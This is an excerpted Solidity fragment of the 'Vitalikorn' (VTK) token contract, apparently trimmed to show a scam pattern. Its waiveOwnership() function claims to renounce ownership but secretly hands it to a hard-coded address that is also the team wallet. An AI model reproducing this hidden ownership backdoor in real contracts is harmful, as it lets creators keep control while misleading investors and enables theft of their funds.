...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x5e5FED946c48dC5CC8764E4A57921A3e11dF3276);
    }
...
contract VITALIKORN is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Vitalikorn";
    string private _symbol = "VTK";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x0b08212159294cE121b3B0A4eda36a77b9a51a32);
    address payable private teamWalletAddress = payable(0x5e5FED946c48dC5CC8764E4A57921A3e11dF3276);
